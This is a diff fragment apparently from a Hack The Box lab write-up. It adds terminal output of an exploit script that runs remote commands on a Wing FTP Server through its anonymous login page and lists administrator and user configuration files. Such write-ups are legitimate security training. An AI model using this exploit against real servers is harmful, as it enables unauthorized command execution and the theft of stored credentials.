@@ -103,3 +103,28 @@ ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "
 uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
 ```
 
+```
+ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "find . -type f -name '*.xml'"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'find . -type f -name '*.xml'' and username: 'anonymous'
+[+] UID extracted: f5a686aac538d57235de1053afb72548f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: f5a686aac538d57235de1053afb72548f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+./Data/_ADMINISTRATOR/admins.xml
+./Data/_ADMINISTRATOR/settings.xml
+./Data/1/users/maria.xml
+./Data/1/users/steve.xml
+./Data/1/users/wacky.xml
+./Data/1/users/anonymous.xml
+./Data/1/users/john.xml
+./Data/1/settings.xml
+./Data/1/portlistener.xml
+./Data/settings.xml
+./webadmin/crossdomain.xml
+./webclient/crossdomain.xml
+----------------------
+ajdev@rootbox:~/HTB/WingData$
+```
+
